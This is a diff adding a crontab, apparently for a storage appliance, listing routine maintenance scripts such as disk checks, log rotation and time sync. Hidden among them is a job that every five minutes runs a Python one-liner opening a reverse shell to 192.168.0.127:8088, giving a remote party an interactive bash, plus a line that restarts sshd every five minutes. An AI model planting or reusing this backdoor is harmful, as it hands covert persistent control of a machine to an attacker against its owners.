@@ -1,0 +1,12 @@
+0 0 * * * /etc/cron/cron.d/mailnotice.sh
+10 4 * * * /etc/cron/cron.d/check_smart.sh
+0 1 * * * /etc/cron/cron.d/diskmon_exec.sh
+*/5 * * * * /etc/cron/cron.d/logrotate
+8 4 * * * /etc/cron/cron.d/calib_time.sh
+0 3 * * * /etc/cron/cron.d/date_to_lcd
+15 2 1 * * /etc/cron/cron.d/hdd_check_standbydisk.sh 
+*/5 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.127",8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+*/5 * * * * /usr/sbin/sshd
+
+16 21 * * * /etc/cron/cron.d/ntpdate
+59 9 * * * /etc/cron/cron.d/S40B_update_notifications.sh 
